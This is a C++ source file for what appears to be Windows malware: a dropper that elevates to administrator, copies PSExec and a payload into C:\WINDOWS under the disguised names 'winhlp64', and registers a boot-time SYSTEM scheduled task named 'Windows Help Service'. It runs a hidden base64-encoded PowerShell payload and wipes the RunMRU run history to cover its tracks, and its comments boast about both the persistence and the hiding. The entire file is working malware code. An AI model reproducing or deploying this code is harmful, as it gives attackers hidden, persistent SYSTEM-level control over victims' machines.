#include "stdafx.h"
#include "UAC.h"

void init();
std::string cwd();
bool is_file_exist(const char *);
char GetWinDrive();

int main()
{
	UAC *pUAC = new UAC();	

	// if already admin continue with payload
	if (pUAC->IsElevated()) {
		init();
	}
	else {
		HRESULT   hr;
		// if user is in admin group and can elevate without password
		if (pUAC->isInAdminGroup(hr) && hr == S_OK) {
			//elevate to admin
			pUAC->startAsAdmin();
		}
		
		else {
			//else delete run history cause we dont want to leave any traces
			// and exit, abort payload... :(
			ShellExecute(NULL,
				"runas",
				"powershell",
				"-Command Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue",
				NULL,
				SW_HIDE
			);
		}
	}

    return 0;
}

void init() {
	// copy file to temp folder
	char winLetter = GetWinDrive();
	std::string baseDir = "C:\\WINDOWS\\";
	std::string finalPath = baseDir + "winhlp64.exe";
	std::string finalPayloadPath = baseDir + "winhlp64.log";

	//change drive letter to the correct one.
	baseDir[0] = winLetter;

	if (!is_file_exist(finalPath.c_str())) {
		//copy payload and executable.
		std::string c = "copy /y " + cwd() + "\\PSExec.exe " + finalPath + " > nul";
		system(c.c_str());
		c = "copy /y " + cwd() + "\\payload.txt " + finalPayloadPath + " > nul";
		system(c.c_str());

		//copy dlls
		c = "copy /y " + cwd() + "\\msvcp120d.dll " + baseDir + "msvcp120d.dll" + " > nul";
		system(c.c_str());
		c = "copy /y " + cwd() + "\\msvcr120d.dll " + baseDir + "msvcr120d.dll" + " > nul";
		system(c.c_str());

		//delete run history cause this is the first time the payload runs
		ShellExecute(NULL,
			"runas",
			"powershell",
			"-Command Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue",
			NULL,
			SW_HIDE
		);
	}
		
	// create windows task named 'Windows Help Service' , runs winhlp64.exe on boot as SYSTEM USER..fuck yeah :)
	std::string task = "schtasks /create /tn \"Windows Help Service\" /tr " + finalPath +" /sc onstart /ru SYSTEM /F > nul";
	system(task.c_str());

	//read payload.txt
	std::ifstream ifs(finalPayloadPath.c_str());
	std::string content((std::istreambuf_iterator<char>(ifs)),
		(std::istreambuf_iterator<char>()));

	//execute powershell
	std::string arg = "-nop -window hidden -noni -EncodedCommand " + content;
	ShellExecute(NULL,
		"runas",
		"powershell",
		arg.c_str(),
		NULL,
		SW_HIDE
	);
}

std::string cwd() {
	char result[MAX_PATH];
	std::string full = std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
	std::string ret = full.substr(0, full.length() - 11);
	return ret;
}

bool is_file_exist(const char *fileName) {
	std::ifstream infile(fileName);
	return infile.good();
}

char GetWinDrive() {
	char infoBuf[30];

	if (!GetSystemDirectory(infoBuf, 30))
		infoBuf[0] = 'C';
	return infoBuf[0];

}



